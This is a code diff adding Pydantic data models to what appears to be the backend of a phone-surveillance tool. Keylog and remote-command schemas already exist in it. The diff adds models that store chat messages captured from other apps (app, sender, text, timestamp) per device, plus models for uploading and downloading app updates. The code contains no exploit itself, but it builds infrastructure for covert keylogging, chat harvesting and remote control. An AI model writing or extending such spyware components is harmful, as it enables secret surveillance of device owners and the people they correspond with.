@@ -211,6 +211,24 @@ class Keylog(KeylogBase):
     class Config:
         from_attributes = True
 
+class ChatMessageBase(BaseModel):
+    package_name: str
+    app_name: str
+    sender: str
+    text: str
+    timestamp: int
+
+class ChatMessageCreate(ChatMessageBase):
+    device_id: Optional[int] = None
+
+class ChatMessage(ChatMessageBase):
+    id: int
+    owner_id: int
+    device_id: Optional[int] = None
+
+    class Config:
+        from_attributes = True
+
 class CommandCreateRequest(BaseModel):
     device_id: int
     command: str
@@ -231,3 +249,16 @@ class PresignedPutRequest(BaseModel):
 class PresignedPutResponse(BaseModel):
     upload_url: Optional[str] = None
     s3_key: str
+
+class AppUpdateUploadResponse(BaseModel):
+    id: int
+    version_name: str
+    version_code: int
+    file_size: int = 0
+    s3_key: str
+    created_at: Optional[datetime] = None
+    class Config:
+        from_attributes = True
+
+class AppUpdateDownloadResponse(BaseModel):
+    download_url: str
